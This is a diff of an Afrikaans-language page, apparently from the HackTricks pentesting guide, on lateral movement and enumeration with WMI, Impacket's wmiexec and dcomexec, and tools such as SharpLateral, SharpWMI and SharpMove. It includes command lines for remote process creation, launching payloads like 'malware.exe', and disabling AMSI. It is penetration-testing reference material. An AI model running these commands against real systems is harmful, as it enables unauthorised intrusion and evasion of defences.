@@ -4,16 +4,16 @@
 
 ## Hoe Dit Werk
 
-Proses kan geopen word op gasheer waar die gebruikersnaam en óf wagwoord óf hash bekend is deur die gebruik van WMI. Opdragte word uitgevoer met behulp van WMI deur Wmiexec, wat 'n semi-interaktiewe skaalervaring bied.
+Proses kan op gasheer oopgemaak word waar die gebruikersnaam en óf wagwoord óf hash bekend is deur die gebruik van WMI. Opdragte word uitgevoer met behulp van WMI deur Wmiexec, wat 'n semi-interaktiewe skaalervaring bied.
 
-**dcomexec.py:** Deur verskillende DCOM eindpunte te benut, bied hierdie skrip 'n semi-interaktiewe skaal soortgelyk aan wmiexec.py, spesifiek die ShellBrowserWindow DCOM objek. Dit ondersteun tans MMC20. Toepassing, Shell Windows, en Shell Browser Window objek. (bron: [Hacking Articles](https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/))
+**dcomexec.py:** Deur verskillende DCOM-eindpunte te benut, bied hierdie skrip 'n semi-interaktiewe skaal soortgelyk aan wmiexec.py, spesifiek deur die ShellBrowserWindow DCOM-objek te benut. Dit ondersteun tans MMC20. Aansoek, Shell Windows, en Shell Browser Window-objekte. (bron: [Hacking Articles](https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/))
 
 ## WMI Grondbeginsels
 
-### Namespace
+### Naamruimte
 
-Gestructureer in 'n gids-styl hiërargie, is WMI se topvlak houer \root, waaronder addisionele gidse, bekend as namespaces, georganiseer is. 
-Opdragte om namespaces te lys:
+Gestructureer in 'n gidsstyl hiërargie, is WMI se topvlak houer \root, waaronder addisionele gidse, bekend as naamruimtes, georganiseer is.
+Opdragte om naamruimtes te lys:
 ```bash
 # Retrieval of Root namespaces
 gwmi -namespace "root" -Class "__Namespace" | Select Name
@@ -59,9 +59,9 @@ Invoke-WmiMethod -Class win32_share -Name Create -ArgumentList @($null, "Descrip
 ```
 ## WMI Opname
 
-### WMI Diensstatus
+### WMI Diens Status
 
-Opdragte om te verifieer of die WMI-diens operasioneel is:
+Opdragte om te verifieer of die WMI diens operasioneel is:
 ```bash
 # WMI service status check
 Get-Service Winmgmt
@@ -69,14 +69,14 @@ Get-Service Winmgmt
 # Via CMD
 net start | findstr "Instrumentation"
 ```
-### Stelsel- en Prosesinligting
+### Stelsel en Proses Inligting
 
 Versameling van stelsel- en prosesinligting deur WMI:
 ```bash
 Get-WmiObject -ClassName win32_operatingsystem | select * | more
 Get-WmiObject win32_process | Select Name, Processid
 ```
-Vir aanvallers is WMI 'n kragtige hulpmiddel om sensitiewe data oor stelsels of domeine te enumeer.
+Vir aanvallers is WMI 'n kragtige hulpmiddel om sensitiewe data oor stelsels of domeine te enummer.
 ```bash
 wmic computerystem list full /format:list
 wmic process list /format:list
@@ -97,14 +97,28 @@ wmic /node:hostname /user:user path win32_process call create "empire launcher s
 ```
 Hierdie proses illustreer WMI se vermoë vir afstandsuitvoering en stelselening, wat die nut daarvan vir beide stelselsadministrasie en penetrasietoetsing beklemtoon.
 
-## Verwysings
-
-- [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
-
 ## Outomatiese Gereedskap
 
 - [**SharpLateral**](https://github.com/mertdas/SharpLateral):
 ```bash
 SharpLateral redwmi HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe
 ```
+- [**SharpWMI**](https://github.com/GhostPack/SharpWMI)
+```bash
+SharpWMI.exe action=exec [computername=HOST[,HOST2,...]] command=""C:\\temp\\process.exe [args]"" [amsi=disable] [result=true]
+# Stealthier execution with VBS
+SharpWMI.exe action=executevbs [computername=HOST[,HOST2,...]] [script-specification] [eventname=blah] [amsi=disable] [time-specs]
+```
+- [**https://github.com/0xthirteen/SharpMove**](https://github.com/0xthirteen/SharpMove):
+```bash
+SharpMove.exe action=query computername=remote.host.local query="select * from win32_process" username=domain\user password=password
+SharpMove.exe action=create computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true username=domain\user password=password
+SharpMove.exe action=executevbs computername=remote.host.local eventname=Debug amsi=true username=domain\\user password=password
+```
+- Jy kan ook **Impacket se `wmiexec`** gebruik.
+
+## Verwysings
+
+- [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
+
 {{#include ../../banners/hacktricks-training.md}}
